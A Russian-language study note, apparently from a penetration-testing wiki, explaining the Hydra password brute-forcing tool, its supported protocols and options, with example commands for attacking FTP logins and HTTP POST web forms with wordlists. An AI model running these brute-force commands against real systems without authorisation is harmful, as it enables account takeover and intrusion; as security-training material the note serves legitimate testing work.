[[Web_tools]]

==🔴Hydra== — это онлайн-программа для взлома паролей методом перебора, инструмент для быстрого «взлома» паролей при входе в систему.

Hydra может пройтись по списку и методом перебора подобрать пароль для некоторых служб аутентификации.

Согласно официальному репозиторию , Hydra поддерживает, то есть имеет возможность перебирать следующие протоколы: “Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MONGODB, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, Radmin, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, TeamSpeak (TS2), Telnet, VMware-Auth, VNC and XMPP.”

Параметры, передаваемые в Hydra, зависят от того, какой сервис (протокол) мы атакуем.

```
hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-SOuvVd46] [service://server[:PORT][/OPT]]
```

```
-R restore a previous aborted/crashed session 
-S perform an SSL connect 
-s PORT if the service is on a different default port, define it here 
-l LOGIN or 
-L FILE login with LOGIN name, or load several logins from FILE 
-p PASS or -P FILE try password PASS, or load several passwords from FILE 
-x MIN:MAX:CHARSET password bruteforce generation, type "-x -h" to get help 
-e nsr try "n" null password, "s" login as pass and/or "r" reversed login 
-u loop around users, not passwords (effective! implied with -x) 
-C FILE colon separated "login:pass" format, instead of -L/-P options 
-M FILE list of servers to attack, one entry per line, ':' to specify port 
-o FILE write found login/password pairs to FILE instead of stdout 
-f / -F exit when a login/pass pair is found (-M: -f per host, -F global) 
-t TASKS run TASKS number of connects in parallel (per host, default: 16) 
-w / -W TIME waittime for responses (32) / between connects per thread (0) 
-4 / -6 use IPv4 (default) / IPv6 addresses (put always in [] also in -M) 
-v / -V / -d verbose mode / show login+pass for each attempt / debug mode 
-O use old SSL v2 and v3 -q do not print messages about connection errors 
-U service module usage details 
server the target: DNS, IP or 192.168.0.0/24 (this OR the -M option) 
service the service to crack (see below for supported protocols) 
OPT some service modules support additional input (-U for module help)
```

Например, если мы хотим взломать FTP методом перебора, используя имя пользователя `user` и список паролей  `passlist.txt`, мы бы использовали следующую команду:
```
hydra -l user -P passlist.txt ftp://ip_machine
```

Мы также можем использовать Hydra для перебора паролей веб-форм. Необходимо знать тип запроса; обычно используются методы GET или POST.
```
sudo hydra <username> <wordlist> 10.112.130.227 http-post-form "<path>:<login_credentials>:<invalid_response>"
```

если веб-сервер прослушивает порт, отличный от порта по умолчанию, вы можете явно указать номер порта, используя  -s \<port>, например:

```
hydra -l <username> -P <wordlist> 10.112.130.227 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -s <port> -V
```

